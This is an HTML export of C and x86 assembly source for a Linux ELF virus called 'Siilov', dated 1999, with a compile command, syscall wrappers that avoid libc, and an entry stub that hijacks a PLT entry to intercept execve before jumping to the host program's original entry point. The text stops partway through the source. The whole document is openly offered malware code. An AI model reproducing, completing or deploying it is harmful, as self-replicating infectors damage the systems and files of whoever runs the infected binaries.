<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc12 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
    THE SILLOV VIRUS

    - Silvio Cesare &lt;silvio@big.net.au&gt;
    - http://www.big.net.au/~silvio
    - http://virus.beergrave.net
    - December 1999

    gcc siilov-src.c -o siilov.bin -O2 -nostdlib
*/</span><span class="sc0">

</span><span class="sc9">#include &lt;linux/types.h&gt;
#include &lt;asm/unistd.h&gt;
#include &lt;linux/fcntl.h&gt;
#include &lt;linux/mman.h&gt;
#include &lt;linux/dirent.h&gt;
#include &lt;elf.h&gt;
</span><span class="sc0">
</span><span class="sc1">/* stdio. normally has these, but where trying to avoid libc */</span><span class="sc0">

</span><span class="sc9">#define SEEK_SET        0
#define SEEK_CUR        1
#define SEEK_END        2
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">dev_t</span><span class="sc0"> </span><span class="sc11">st_dev</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* Device.  */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__pad1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">ino_t</span><span class="sc0"> </span><span class="sc11">st_ino</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* File serial number.  */</span><span class="sc0">
        </span><span class="sc11">mode_t</span><span class="sc0"> </span><span class="sc11">st_mode</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc1">/* File mode.  */</span><span class="sc0">
        </span><span class="sc11">nlink_t</span><span class="sc0"> </span><span class="sc11">st_nlink</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* Link count.  */</span><span class="sc0">
        </span><span class="sc11">uid_t</span><span class="sc0"> </span><span class="sc11">st_uid</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* User ID of the file's owner. */</span><span class="sc0">
        </span><span class="sc11">gid_t</span><span class="sc0"> </span><span class="sc11">st_gid</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/* Group ID of the file's group.*/</span><span class="sc0">
        </span><span class="sc11">dev_t</span><span class="sc0"> </span><span class="sc11">st_rdev</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">/* Device number, if device.  */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__pad2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">off_t</span><span class="sc0"> </span><span class="sc11">st_size</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">/* Size of file, in bytes.  */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">st_blksize</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc1">/* Optimal block size for I/O.  */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">st_blocks</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* Number of 512-byte blocks allocated.
 */</span><span class="sc0">
        </span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">st_atime</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* Time of last access.  */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">st_mtime</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* Time of last modification.  */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">time_t</span><span class="sc0"> </span><span class="sc11">st_ctime</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* Time of last status change.  */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused3</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused4</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__unused5</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/*
        Remember, we cant use libc even for things like open, close etc

        New __syscall macros are made so not to use errno which are just
        modified _syscall routines from asm/unistd.h
*/</span><span class="sc0">

</span><span class="sc9">#define __syscall0(type,name) \
type _##name(void) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name)); \
        return (type) __res; \
}
</span><span class="sc0">
</span><span class="sc9">#define __syscall1(type,name,type1,arg1) \
type _##name(type1 arg1) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1))); \
        return (type) __res; \
}
</span><span class="sc0">
</span><span class="sc9">#define __syscall2(type,name,type1,arg1,type2,arg2) \
type _##name(type1 arg1,type2 arg2) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
        return (type) __res; \
}
</span><span class="sc0">
</span><span class="sc9">#define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
type _##name(type1 arg1,type2 arg2,type3 arg3) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
                "d" ((long)(arg3))); \
        return (type) __res; \
}
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc9">#define DATA_ENTRY_POINT    0
</span><span class="sc0">
</span><span class="sc9">#define ORIG_ENTRY_POINT    0
#define ORIG_PLT_ADDR       1
#define PLT_ADDR        2
#define USE_PLT         3
#define STORE           4
</span><span class="sc0">
</span><span class="sc9">#define VIRUS_LENGTH    (virendall - virstart)
#define CHAIN_LENGTH    (virchend - virchstart)
#define PAGE_SIZE   4096
#define PAGE_MASK   (PAGE_SIZE - 1)
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">Elf32_Ehdr</span><span class="sc0">      </span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Elf32_Phdr</span><span class="sc10">*</span><span class="sc0">     </span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Elf32_Shdr</span><span class="sc10">*</span><span class="sc0">     </span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">plen</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc10">**</span><span class="sc0">          </span><span class="sc11">section</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0">       </span><span class="sc11">string</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0">             </span><span class="sc11">bss</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">bin_t</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virstart</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virchend</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virchstart</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">getvirchdata</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">getvirdata</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">plt_execve</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*[],</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*[]);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">init_virus</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin_t</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virendall</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">get_virus</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virfunc</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">__asm__</span><span class="sc10">(</span><span class="sc12">"
</span><span class="sc10">.</span><span class="sc11">globl</span><span class="sc0"> </span><span class="sc11">L1</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">type</span><span class="sc0"> </span><span class="sc11">virstart</span><span class="sc10">,</span><span class="sc11">@function</span><span class="sc0">
</span><span class="sc11">virstart</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc0">
    </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebx</span><span class="sc0">
    </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ecx</span><span class="sc0">
    </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">edx</span><span class="sc0">

    </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">virmain</span><span class="sc0">
</span><span class="sc11">virmain</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">esi</span><span class="sc0">               #
    </span><span class="sc11">addl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">(</span><span class="sc11">virdata</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virmain</span><span class="sc10">),%</span><span class="sc11">esi</span><span class="sc0">      # </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$virdata</span><span class="sc10">,%</span><span class="sc11">esi</span><span class="sc0">

    </span><span class="sc11">cmpl</span><span class="sc0"> </span><span class="sc11">$0</span><span class="sc10">,</span><span class="sc11">use_plt</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virdata</span><span class="sc10">(%</span><span class="sc11">esi</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">jz</span><span class="sc0"> </span><span class="sc11">skip_plt</span><span class="sc0">

</span><span class="sc9"># this can be converted to C but should we bother?
</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">plt_addr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virdata</span><span class="sc10">(%</span><span class="sc11">esi</span><span class="sc10">),%</span><span class="sc11">ebx</span><span class="sc0">  #
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">(%</span><span class="sc11">ebx</span><span class="sc10">),%</span><span class="sc11">ecx</span><span class="sc0">            #
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ecx</span><span class="sc10">,</span><span class="sc11">orig_plt_addr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virdata</span><span class="sc10">(%</span><span class="sc11">esi</span><span class="sc10">)</span><span class="sc0"> # </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">plt_addr</span><span class="sc10">,</span><span class="sc11">orig_plt_addr</span><span class="sc0">

    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">esi</span><span class="sc10">,%</span><span class="sc11">ebx</span><span class="sc0">              #
    </span><span class="sc11">subl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">(</span><span class="sc11">virdata</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">plt_execve</span><span class="sc10">),%</span><span class="sc11">ebx</span><span class="sc0">   #
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">plt_addr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virdata</span><span class="sc10">(%</span><span class="sc11">esi</span><span class="sc10">),%</span><span class="sc11">ecx</span><span class="sc0">  #
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebx</span><span class="sc10">,(%</span><span class="sc11">ecx</span><span class="sc10">)</span><span class="sc0">            # </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$plt_execve</span><span class="sc10">,</span><span class="sc11">plt_addr</span><span class="sc0">

</span><span class="sc11">skip_plt</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$125</span><span class="sc10">,%</span><span class="sc11">eax</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">orig_entry_point</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virdata</span><span class="sc10">(%</span><span class="sc11">esi</span><span class="sc10">),%</span><span class="sc11">ebx</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebx</span><span class="sc10">,%</span><span class="sc11">edi</span><span class="sc0">              # </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc11">later</span><span class="sc0">
    </span><span class="sc11">andl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">~</span><span class="sc4">4095</span><span class="sc10">,%</span><span class="sc11">ebx</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$8192</span><span class="sc10">,%</span><span class="sc11">ecx</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$7</span><span class="sc10">,%</span><span class="sc11">edx</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">$0x80</span><span class="sc0">

    </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">edi</span><span class="sc0">
    </span><span class="sc11">leal</span><span class="sc0"> </span><span class="sc11">store</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virdata</span><span class="sc10">(%</span><span class="sc11">esi</span><span class="sc10">),%</span><span class="sc11">esi</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">(</span><span class="sc11">virchend</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virchstart</span><span class="sc10">),%</span><span class="sc11">ecx</span><span class="sc0">
    </span><span class="sc11">rep</span><span class="sc0">
    </span><span class="sc11">movsb</span><span class="sc0">

    </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">_vstart</span><span class="sc0">

    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">edi</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">edx</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ecx</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebx</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc0">

    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc10">*%</span><span class="sc11">edi</span><span class="sc0">

</span><span class="sc10">.</span><span class="sc11">globl</span><span class="sc0"> </span><span class="sc11">getvirdata</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">type</span><span class="sc0"> </span><span class="sc11">getvirdata</span><span class="sc10">,</span><span class="sc11">@function</span><span class="sc0">
</span><span class="sc11">getvirdata</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebp</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">esp</span><span class="sc10">,%</span><span class="sc11">ebp</span><span class="sc0">

    </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">getvirdatamain</span><span class="sc0">

</span><span class="sc11">getvirdatamain</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc0">               #
    </span><span class="sc11">addl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">(</span><span class="sc11">virdata</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">getvirdatamain</span><span class="sc10">),%</span><span class="sc11">eax</span><span class="sc0">   # </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$virdata</span><span class="sc10">,%</span><span class="sc11">eax</span><span class="sc0">

    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebp</span><span class="sc10">,%</span><span class="sc11">esp</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebp</span><span class="sc0">

    </span><span class="sc11">ret</span><span class="sc0">

</span><span class="sc11">virdata</span><span class="sc10">:</span><span class="sc0">

</span><span class="sc11">orig_entry_point</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">

</span><span class="sc11">orig_plt_addr</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">

</span><span class="sc11">plt_addr</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">

</span><span class="sc11">use_plt</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">

</span><span class="sc11">store</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">zero</span><span class="sc0"> </span><span class="sc11">virchend</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virchstart</span><span class="sc0">

</span><span class="sc12">");
</span><span class="sc1">/*
    we have a little wasted space here from cleaning up the stack frame
    in the wrapper function.
*/</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">exit</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">status</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">brk</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">brk</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall2</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fstat</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">unlink</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">pathname</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fchown</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">uid_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">owner</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">gid_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">group</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall2</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">oldpath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">newpath</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">flag</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mode</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall1</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">close</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc11">off_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filedes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">off_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">whence</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc11">ssize_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc11">ssize_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">write</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mprotect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">caddr_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size_t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">prot</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall3</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">getdents</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">dirp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">count</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">__syscall0</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">geteuid</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">id</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
    </span><span class="sc6">"Siilov, Decemeber 1999, Silvio Cesare &lt;silvio@big.net.au&gt;"</span><span class="sc0">
</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
    a pseduo data segment for various strings (remmeber, we have to be
    relocateable)
*/</span><span class="sc0">

</span><span class="sc9">#define ORIGINAL_BRK    0
